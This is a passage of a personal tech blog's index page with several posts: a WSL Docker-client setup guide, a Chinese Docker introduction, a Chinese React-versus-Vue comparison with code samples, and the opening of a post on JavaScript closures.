  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Django/">Django</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MVC/">MVC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rail/">Rail</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPS/">VPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后端/">后端</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/语法堂/">语法堂</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/09/25/Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu/">Installing the Docker client on Windows Subsystem for Linux (Ubuntu)</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/09/25/Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu/" class="article-date">
	  <time datetime="2017-09-25T12:09:25.000Z" itemprop="datePublished">2017-09-25</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <img src="/2017/09/25/Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu/1.png">
<p>I’m a PC guy, I have always been. I played around a little bit with Linux back in the university days, but that was it.</p>
<p>But now, Windows brought Linux a little closer. I don’t have to do anything complicated like dual booting or having another computer set up just to experience the Linux (non GUI) environment.</p>
<p>As a Windows Insider, I tried the Windows Subsystem for Linux since day 1 and I really enjoyed it.</p>
<p>Now that Falls Creators Update is out, I’m using the Ubuntu distro from the store, and the first thing I want to do is having the Docker client installed.. It is not rocket science, but I did have some bumps on the road (because of my pretty low knowledge of Linux), so I thought I’d write what I’ve done to achieve that, in case it could be useful to somebody else.</p>
<p>There’s something you need to understand first. The Docker Engine does not run on WSL, you HAVE to have Docker For Windows installed on your host machine. What we’ll end up with at the end of this document is the Docker client running on Linux (WSL) sending commands to your Docker Engine daemon installed on Windows.</p>
<p>So, open you Ubuntu bash console, the first thing is to install the client. In order to do that you have to use apt-get, which is Ubuntu’s package manager (more info about apt here).</p>
<p>Update the apt package index:<br>$ sudo apt-get update</p>
<h2 id="2-Install-packages-to-allow-apt-to-use-a-repository-over-HTTPS"><a href="#2-Install-packages-to-allow-apt-to-use-a-repository-over-HTTPS" class="headerlink" title="2. Install packages to allow apt to use a repository over HTTPS:"></a>2. Install packages to allow apt to use a repository over HTTPS:</h2><p>  $ sudo apt-get install \<br>  apt-transport-https \<br>  ca-certificates \<br>  curl \<br>  software-properties-common</p>
<h2 id="3-Add-Docker’s-official-GPG-key"><a href="#3-Add-Docker’s-official-GPG-key" class="headerlink" title="3. Add Docker’s official GPG key:"></a>3. Add Docker’s official GPG key:</h2><p>  $ curl -fsSL <a href="https://download.docker.com/linux/ubuntu/gpg" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/gpg</a> | sudo apt-key add -</p>
<p>Verify that you now have the key with the fingerprint 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88, by searching for the last 8 characters of the fingerprint.</p>
<p>  $ sudo apt-key fingerprint 0EBFCD88</p>
<p>pub 4096R/0EBFCD88 2017–02–22<br> Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88<br>uid Docker Release (CE deb) <a href="mailto:&#x64;&#x6f;&#x63;&#x6b;&#x65;&#x72;&#x40;&#x64;&#x6f;&#x63;&#x6b;&#x65;&#x72;&#46;&#99;&#111;&#x6d;" target="_blank" rel="noopener">&#x64;&#x6f;&#x63;&#x6b;&#x65;&#x72;&#x40;&#x64;&#x6f;&#x63;&#x6b;&#x65;&#x72;&#46;&#99;&#111;&#x6d;</a><br>sub 4096R/F273FCD8 2017–02–22</p>
<h2 id="4-Use-the-following-command-to-set-up-the-stable-repository-You-always-need-the-stable-repository-even-if-you-want-to-install-builds-from-the-edge-or-test-repositories-as-well-To-add-the-edge-or-test-repository-add-the-word-edge-or-test-or-both-after-the-word-stable-in-the-commands-below"><a href="#4-Use-the-following-command-to-set-up-the-stable-repository-You-always-need-the-stable-repository-even-if-you-want-to-install-builds-from-the-edge-or-test-repositories-as-well-To-add-the-edge-or-test-repository-add-the-word-edge-or-test-or-both-after-the-word-stable-in-the-commands-below" class="headerlink" title="4. Use the following command to set up the stable repository. You always need the stable repository, even if you want to install builds from the edge or test repositories as well. To add the edge or test repository, add the word edge or test (or both) after the word stable in the commands below."></a>4. Use the following command to set up the stable repository. You always need the stable repository, even if you want to install builds from the edge or test repositories as well. To add the edge or test repository, add the word edge or test (or both) after the word stable in the commands below.</h2><p>  $ sudo add-apt-repository \<br>  “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> \<br>  $(lsb_release -cs) \<br>  stable”</p>
<p>Now we’re ready to install Docker Community Edition</p>
<h2 id="5-Update-the-apt-package-index-again"><a href="#5-Update-the-apt-package-index-again" class="headerlink" title="5. Update the apt package index again"></a>5. Update the apt package index again</h2><p>  $ sudo apt-get update</p>
<h2 id="6-And-install-Docker-CE"><a href="#6-And-install-Docker-CE" class="headerlink" title="6. And install Docker CE"></a>6. And install Docker CE</h2><p>  $ sudo apt-get install docker-ce</p>
<p>When that finishes, you’ll end up having everything installed in Linux, but as I mentioned before, the Docker Engine does not run in WSL so if you write any command like docker images, you’ll see a message like this one:</p>
<p>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?<br>No, it is not running and it’ll never be, at least for now.</p>
<p>You need to tell the Docker client where the Docker host is, and you can do that by using the -H option as follows:</p>
<p>  $ docker -H localhost:2375 images</p>
<p>If you don’t want to type the host every time, you can set up and environment variable called DOCKER_HOST to localhost:2375</p>
<p>  $ export DOCKER_HOST=localhost:2375</p>
<p>Now just running docker images will show the images in your host environment.</p>
<p>But, that environment variable will last only as long as the session does. You would have to set it every time you open bash. So, in order to avoid that, you set that variable in a file called .bash_profile in your home directory, like this:</p>
<p>  $ echo “export DOCKER_HOST=localhost:2375” &gt;&gt; ~/.bash_profile</p>
<p>Restart the bash console and the DOCKER_HOST variable should be there, just type docker images to check everything is there.</p>
<p>I hope this post will help other, if it does, let me know.</p>
<p>EDIT: Make sure you expose the daemon on Windows, otherwise it won’t work.<br><img src="/2017/09/25/Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu/2.png"></p>
<p>References: Get Docker CE for Ubuntu</p>
<p>Special thanks to Rich Turner for his kindness and patience.</p>
<p>EDIT: I recently learned there’s an official, more complicated but secure, way of achieving the same, so I thought I’d share it here: WSL Interoperability with Docker</p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Docker/">Docker</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ubutun/">Ubutun</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPS/">VPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WSL/">WSL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Window-10/">Window 10</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/部署/">部署</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-docker初探"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/09/12/docker初探/">docker初探</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/09/12/docker初探/" class="article-date">
	  <time datetime="2017-09-12T13:38:27.000Z" itemprop="datePublished">2017-09-12</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Docker-CE-还是-Docker-EE"><a href="#Docker-CE-还是-Docker-EE" class="headerlink" title="Docker CE 还是 Docker EE"></a>Docker CE 还是 Docker EE</h2><p>Docker在2016年很早的时候就明确了将会在企业级方面重点跟进。而在短短的一年时间之内推出的1.12和1.13的版本在功能上确实是很大的进步。而在2017年的3月1号之后，Docker的版本命名开始发生变化，同时将CE版本和EE版本进行分开，而这些也是突然发现docker1.13的安装脚本不好用了才发现的，一起简单来看一下具体情况吧。</p>
<h2 id="平台支持"><a href="#平台支持" class="headerlink" title="平台支持"></a>平台支持</h2><p>目前docker的CE和EE所支持的平台情况如下所示，大家所钟情的Ubuntu和CentOS作为Linux发行版所支持的CE和EE均支持的。<br><img src="/2017/09/12/docker初探/1.JPG"></p>
<h2 id="Get-Started-Part-1-Orientation-and-setup"><a href="#Get-Started-Part-1-Orientation-and-setup" class="headerlink" title="Get Started, Part 1: Orientation and setup"></a>Get Started, Part 1: Orientation and setup</h2><p>Welcome! We are excited that you want to learn Docker. The <em>Docker Get Started Tutorial</em><br>teaches you how to:</p>
<ol>
<li>Set up your Docker environment (on this page)</li>
<li><a href="/get-started/part2/">Build an image and run it as one container</a></li>
<li><a href="/get-started/part3/">Scale your app to run multiple containers</a></li>
<li><a href="/get-started/part4/">Distribute your app across a cluster</a></li>
<li><a href="/get-started/part5/">Stack services by adding a backend database</a></li>
<li><a href="/get-started/part6/">Deploy your app to production</a></li>
</ol>
<h2 id="Docker-concepts"><a href="#Docker-concepts" class="headerlink" title="Docker concepts"></a>Docker concepts</h2><p>Docker is a platform for developers and sysadmins to <strong>develop, deploy, and run</strong><br>applications with containers. The use of Linux containers to deploy applications<br>is called <em>containerization</em>. Containers are not new, but their use for easily<br>deploying applications is.</p>
<p>Containerization is increasingly popular because containers are:</p>
<ul>
<li>Flexible: Even the most complex applications can be containerized.</li>
<li>Lightweight: Containers leverage and share the host kernel.</li>
<li>Interchangeable: You can deploy updates and upgrades on-the-fly.</li>
<li>Portable: You can build locally, deploy to the cloud, and run anywhere.</li>
<li>Scalable: You can increase and automatically distribute container replicas.</li>
<li>Stackable: You can stack services vertically and on-the-fly.</li>
</ul>
<img src="/2017/09/12/docker初探/2.png">
<h3 id="Images-and-containers"><a href="#Images-and-containers" class="headerlink" title="Images and containers"></a>Images and containers</h3><p>A container is launched by running an image. An <strong>image</strong> is an executable<br>package that includes everything needed to run an application–the code, a<br>runtime, libraries, environment variables, and configuration files.</p>
<p>A <strong>container</strong> is a runtime instance of an image–what the image becomes in<br>memory when executed (that is, an image with state, or a user process). You can<br>see a list of your running containers with the command, <code>docker ps</code>, just as you<br>would in Linux.</p>
<h3 id="Containers-and-virtual-machines"><a href="#Containers-and-virtual-machines" class="headerlink" title="Containers and virtual machines"></a>Containers and virtual machines</h3><p>A <strong>container</strong> runs <em>natively</em> on Linux and shares the kernel of the host<br>machine with other containers. It runs a discrete process, taking no more memory<br>than any other executable, making it lightweight.</p>
<p>By contrast, a <strong>virtual machine</strong> (VM) runs a full-blown “guest” operating<br>system with <em>virtual</em> access to host resources through a hypervisor. In general,<br>VMs provide an environment with more resources than most applications need.</p>
<h2 id="Prepare-your-Docker-environment"><a href="#Prepare-your-Docker-environment" class="headerlink" title="Prepare your Docker environment"></a>Prepare your Docker environment</h2><p>Install a maintained version of Docker Community Edition (CE) or Enterprise Edition (EE) on a supported platform.</p>
<p>Ensure that you have a supported version of Docker:</p>
<p>‘’’$ docker –version<br>Docker version 17.12.0-ce, build c97c6d6</p>
<p>‘’’<br><img src="/2017/09/12/docker初探/2.JPG"><br><img src="/2017/09/12/docker初探/3.JPG"></p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPS/">VPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker/">docker</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/搭建/">搭建</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/管理/">管理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/虚拟机/">虚拟机</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-React-vue"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/03/12/React-vue/">React/vue</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/03/12/React-vue/" class="article-date">
	  <time datetime="2016-03-12T06:24:14.000Z" itemprop="datePublished">2016-03-12</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>2016年，React巩固了它JavaScript web框架之王的地位。在这一年里，Web和原生APP的库都迅速发展，同时与Angular相比，也具有明显优势。</p>
<p>与此同时，2016年对于Vue而言，也是很重要的一年。Vue2的发布给JavaScript社区带来了巨大的冲击，在Github上获得了25000个star。</p>
<p>不可否认，React和Vue的范围十分类似：它们都是轻量级的组件库，都用于构建用户界面，专注于视图层。两者都可以在简单项目中，也可以使用工具将它们扩展为复杂的应用程序。</p>
<p>因此，很多web开发人员都想知道，到底应该选择哪一个？一个明显优于另一个？有什么需要注意的利弊吗？还是说，两者基本相同？</p>
<h2 id="两个框架，两个倡导者"><a href="#两个框架，两个倡导者" class="headerlink" title="两个框架，两个倡导者"></a>两个框架，两个倡导者</h2><p>在本文中，我想彻底地公正地比较两者之前的区别。唯一的问题就是：我是Vue的爱好者，必然会有一些偏见。我经常在我的项目中使用Vue，还发布了一些在线教程，即<a href="https://www.udemy.com/vuejs-2-essentials/?couponCode=JSDOJO-CM" target="_blank" rel="noopener">Ultimate Vue.js Developers course</a></p>
<p>为了摆脱我偏见的影响，我找到了我的朋友Alexis Mangin，他是一名优秀的JavaScript开发者，也是React的爱好者。他沉浸在React中，经常在Web和移动APP开发中使用React。</p>
<p>Alexis曾经问我：“为什么你这么喜欢Vue，从来不用React？”。由于我不太了解React，我很难回答这个问题。所以，我决定，一起坐下来，展示我们选择的库，看看它们究竟能提供什么东西。</p>
<img src="/2016/03/12/React-vue/2017-3-3-reactorvue1.jpeg">
<p>经过激烈的讨论和互相学习，我们得出了以下6个结论。</p>
<h3 id="如果你喜欢使用模板（-或需要一些其中的选项）构建应用程序，那么请选择Vue"><a href="#如果你喜欢使用模板（-或需要一些其中的选项）构建应用程序，那么请选择Vue" class="headerlink" title="如果你喜欢使用模板（ 或需要一些其中的选项）构建应用程序，那么请选择Vue"></a>如果你喜欢使用模板（ 或需要一些其中的选项）构建应用程序，那么请选择Vue</h3><p>将标记放在HTML文件中是Vue应用程序的默认选项。与Angular类似，大括号用于数据绑定表达式，指令（特殊的HTML属性）用于向模板添加功能。下面是一个简单的Vue程序例子。它可以输出一条消息，有一个按钮可以动态反转消息：</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; <span class="keyword">message</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;button v-<span class="keyword">on</span>:click=<span class="string">"reverseMessage"</span>&gt;Reverse <span class="keyword">Message</span>&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: '<span class="comment">#app',</span></span><br><span class="line">  data: &#123;</span><br><span class="line">    <span class="keyword">message</span>: 'Hello Vue.js!</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    reverseMessage: <span class="keyword">function</span> () &#123;</span><br><span class="line">      this.<span class="keyword">message</span> = this.<span class="keyword">message</span>.split('').reverse().join('');</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>相比之下，React应用程序避开模板，要求开放人员在JavaScript中创建DOM，通常用JSX辅助，下面是用React来实现同样的功能：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      message: <span class="string">'Hello React.js!'</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  reverseMessage() &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; </span><br><span class="line">      message: <span class="keyword">this</span>.state.message.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>) </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;&#123;<span class="keyword">this</span>.state.message&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;() =&gt; this.reverseMessage()&#125;&gt;</span></span><br><span class="line"><span class="regexp">          Reverse Message</span></span><br><span class="line"><span class="regexp">        &lt;/</span>button&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">ReactDOM.render(App, document.getElementById('app'));</span></span><br></pre></td></tr></table></figure>
<p>对于学习标准的web初级开发者而言，模板更容易理解。但是也有很多经验丰富的开发人员乐意使用模板，因为模板可以更好地分离布局和功能，同时也可以选择向Pug这样的预处理器。</p>
<p>但是，使用模板需要学习所有的HTML扩展语法，渲染函数只需要了解标准的HTML和JavaScript</p>
<h3 id="如果你喜欢简单的能正常工作的，那么请选择Vue"><a href="#如果你喜欢简单的能正常工作的，那么请选择Vue" class="headerlink" title="如果你喜欢简单的能正常工作的，那么请选择Vue"></a>如果你喜欢简单的能正常工作的，那么请选择Vue</h3><p>一个简单的Vue项目可以不需要解析，直接在浏览器中运行，这允许Vue可以像jQuery一样在项目中引用。</p>
<p>虽然在技术上使用React也是可行的，但是典型的React代码更倾向于像classes和non-mulating 数组方法这样的JSX和ES6的特性。但是Vue在简洁设计方面更为深入。我们来比较两者如何处理应用程序的数据（即“状态”）。</p>
<p>在React中State是不可以直接改变的，需要调用setState接口：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">this</span><span class="selector-class">.setState</span>(&#123; </span><br><span class="line">    <span class="attribute">message</span>: this.state.message.<span class="built_in">split</span>(<span class="string">''</span>).<span class="built_in">reverse</span>().<span class="built_in">join</span>(<span class="string">''</span>) </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当前和之前的状态差异让React知道什么时候在DOM中重新渲染以及渲染什么，因此不可变的状态是非常必要的。</p>
<p>相比之下，数据可以在Vue中突变。相同的数据属性在Vue中发生变化更为简单。</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Note that data properties are available as properties of </span></span><br><span class="line"><span class="comment">// the Vue instance</span></span><br><span class="line"><span class="keyword">this</span>.message = <span class="keyword">this</span>.message.<span class="built_in">split</span>(<span class="string">''</span>).<span class="built_in">reverse</span>().<span class="built_in">join</span>(<span class="string">''</span>);</span><br></pre></td></tr></table></figure>
<p>在你得出Vue渲染系统比React渲染低效的结论之前，让我们来看看Vue中的状态管理：当你向状态添加新对象时，Vue会遍历它的所有属性并且转换为getter和setter。Vue系统会持续追踪状态并且在状态发生变化时，自动重新渲染DOM。</p>
<p>令人印象深刻的是，Vue中的状态改变更为简洁的同时，重新渲染系统的效率其实比React更好。</p>
<p>Vue的反应系统确实有值得注意的事项。例如：它不能检测到属性的添加、删除以及特定数组的变化。在这种情况下，可以使用Vue API中类似React的set方法。</p>
<h3 id="如果你希望你的程序更小更快，那么请选择Vue"><a href="#如果你希望你的程序更小更快，那么请选择Vue" class="headerlink" title="如果你希望你的程序更小更快，那么请选择Vue"></a>如果你希望你的程序更小更快，那么请选择Vue</h3><p>React和Vue都将构建一个虚拟DOM，并且在应用程序状态更改时同步更新实际的DOM。两者都有自己的优化方法。Vue核心开发人员提供了一个基准测试，展示了Vue的渲染系统比React的更快。在这个测试中，10000个项目的列表被渲染了100次。下面的表格展示了比较的结果。</p>
<img src="/2016/03/12/React-vue/2017-3-30-react-or-vue2.png">
<p>从实际角度而言，这种基准只与边缘情况有关。大多数应用程序不需要经常进行这种操作，因此不能将其视为比较的一个重要因素。</p>
<p>虽然页面的大小与项目相关，Vue又占据了优势。目前发布的Vue库只有25.6KB。</p>
<p>要用React实现类似的功能，你需要使用React DOM（37.4KB）和React with Addons库（11.4KB），总共为48.8KB，几乎是Vue的两倍。为了公平起见，你可以使用React获得更多的API，但是不会有双倍的功能。</p>
<h3 id="如果你想要构建大型应用程序，那么请选择React"><a href="#如果你想要构建大型应用程序，那么请选择React" class="headerlink" title="如果你想要构建大型应用程序，那么请选择React"></a>如果你想要构建大型应用程序，那么请选择React</h3><p>用Vue和React来实现简单的应用程序，就像本文开头所说的一样，大部分开发者会偏向于Vue。这是因为基于模板的应用程序乍看更容易理解，并且能够更快启动。</p>
<p>但是这些初始的好处会导致大型程序进展缓慢。模板很容易出现运行时错误，难以测试，也不容易重构或分解。</p>
<p>相比之下，JavaScript制作的模板可以被组织成可分解的组件，DRY code也更容易重用和测试。</p>
<p>Vue也具有组件系统和渲染功能。但是React的渲染系统配置性更高，并且具有浅渲染的特性，与React的测试程序结合时，可以提供更多可测试和可维护的代码。</p>
<p>同时，React不可变的代码并不简单，当透明度和可测试性至关重要时，它会发挥更大的作用。</p>
<h3 id="如果你想要一个同时适用于web和原生APP的库，那么请选择React"><a href="#如果你想要一个同时适用于web和原生APP的库，那么请选择React" class="headerlink" title="如果你想要一个同时适用于web和原生APP的库，那么请选择React"></a>如果你想要一个同时适用于web和原生APP的库，那么请选择React</h3><p>React Native是用JavaScript创建原生APP的库。它与React相同，只是将web组件换成了原生组件。如果你学习了React.js，那么你很快就可以学会React Native，反之亦然。</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">React</span>, &#123; <span class="type">Component</span> &#125; from <span class="symbol">'reac</span>t'; </span><br><span class="line"><span class="keyword">import</span> &#123; <span class="type">AppRegistry</span>, <span class="type">Text</span>, <span class="type">View</span> &#125; from <span class="symbol">'react</span>-native';  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;   </span><br><span class="line">  render() &#123;     </span><br><span class="line">    <span class="keyword">return</span> (       </span><br><span class="line">      &lt;<span class="type">View</span>&gt;         </span><br><span class="line">        &lt;<span class="type">Text</span>&gt;<span class="type">Hello</span>, <span class="type">React</span> <span class="type">Native</span>!&lt;/<span class="type">Text</span>&gt;</span><br><span class="line">      &lt;/<span class="type">View</span>&gt;</span><br><span class="line">    );   </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">AppRegistry</span>.registerComponent(<span class="symbol">'HelloWorl</span>d', () =&gt; <span class="type">HelloWorld</span>);</span><br></pre></td></tr></table></figure>
<p>重要的是，开发人员可以构建一个web或者原生APP，他们不需要不同的知识体系和工具。如果您打算开发web和移动APP，React会给你带来巨大冲击。</p>
<p>阿里巴巴的Weex是另一个跨平台UI项目。目前，它认为Vue提供了灵感，并且使用了很多相同的语法，并计划完全集成Vue。但是，这个计划的时间表和细节尚未清晰。</p>
<p>由于Vue将HTML模板作为其设计的核心部分，也没有将客户端渲染作为当前的特性，因此很难看到原生的Vue像React.js或React Native一样紧密。</p>
<h3 id="如果你想要最大的生态系统，那么请选择React"><a href="#如果你想要最大的生态系统，那么请选择React" class="headerlink" title="如果你想要最大的生态系统，那么请选择React"></a>如果你想要最大的生态系统，那么请选择React</h3><p>毫无疑问，React目前是最受欢迎的库，NPM下载量每月约2.5M，Vue每月的下载量为225k。</p>
<img src="/2016/03/12/React-vue/2017-3-30-react-or-vue3.png">
<p>人气带来的好处不止一点半点。这意味有更多的文章、教程和Stack Overflow回答能够帮助。也意味着在项目中有更多的工具和附加组件可用，同时节省了开发人员自己构建所有模块的时间。</p>
<p>两者都是开源的，但是React诞生自Facebook，受益于它。开发者和热爱React的公司都可以保障React一直被维护。</p>
<p>相比之下，Evan You一个人创建了Vue，同时他也是Vue唯一的全职维护人员。Vue得到了一些企业的赞助，但是还达不到Facebook或是Google的规模。</p>
<p>为了使得Vue团队更为可信，它的小体积和独立性目前并不被当做劣势。Vue有规律的发布周期，令人印象深刻的是，Vue在Github上只有54个公开的问题，3456个关闭的问题，而React有530个开放问题，3447个关闭的问题。</p>
<h3 id="如果你已经选择了其中的一个，那么也不需要换了"><a href="#如果你已经选择了其中的一个，那么也不需要换了" class="headerlink" title="如果你已经选择了其中的一个，那么也不需要换了"></a>如果你已经选择了其中的一个，那么也不需要换了</h3><p>总而言之，我们发现，Vue的优势是：</p>
<ul>
<li>模板或渲染的灵活选项</li>
<li>语法以及项目设置的简单</li>
<li>渲染速度更快，体积更小</li>
</ul>
<p>React的优势是：</p>
<ul>
<li>更大的规模、更多的使用者、更好的可测试性</li>
<li>Web和原生APP</li>
<li>能提供更多支持和工具的更大的生态系统</li>
</ul>
<p>然而，React和Vue都是优秀的UI库，并且具有更多的相似之处。它们都有的优势是：</p>
<ul>
<li>使用虚拟DOM快速渲染</li>
<li>轻量级</li>
<li>响应式组件</li>
<li>服务端渲染</li>
<li>轻松集成的的路由、捆绑和状态管理</li>
<li>强大的支持和社区</li>
</ul>
<p>如果你认为我们漏掉了一些东西，欢迎在评论中说明。Happy developing！</p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Angular/">Angular</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/">CSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Dom/">Dom</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ES6/">ES6</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-闭包简介"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/03/11/闭包简介/">闭包简介</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/03/11/闭包简介/" class="article-date">
	  <time datetime="2016-03-11T05:57:40.000Z" itemprop="datePublished">2016-03-11</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="闭包简介"><a href="#闭包简介" class="headerlink" title="闭包简介"></a>闭包简介</h2><p>闭包是JavaScript的重要特性，那么什么是闭包？  </p>
<p>《JavaScript高级程序设计(第3版)》中闭包的定义：</p>
<blockquote>
<p>闭包就是指有权访问另一个函数中的变量的函数。  </p>
</blockquote>
<p>《JavaScript权威指南(第6版)》中闭包的定义：</p>
<blockquote>
<p>函数对象可以通过作用域链相互关联起来，函数体内部的变量都可以保存在函数作用域内，这种特性在计算机科学文献中成为“闭包”。</p>
</blockquote>
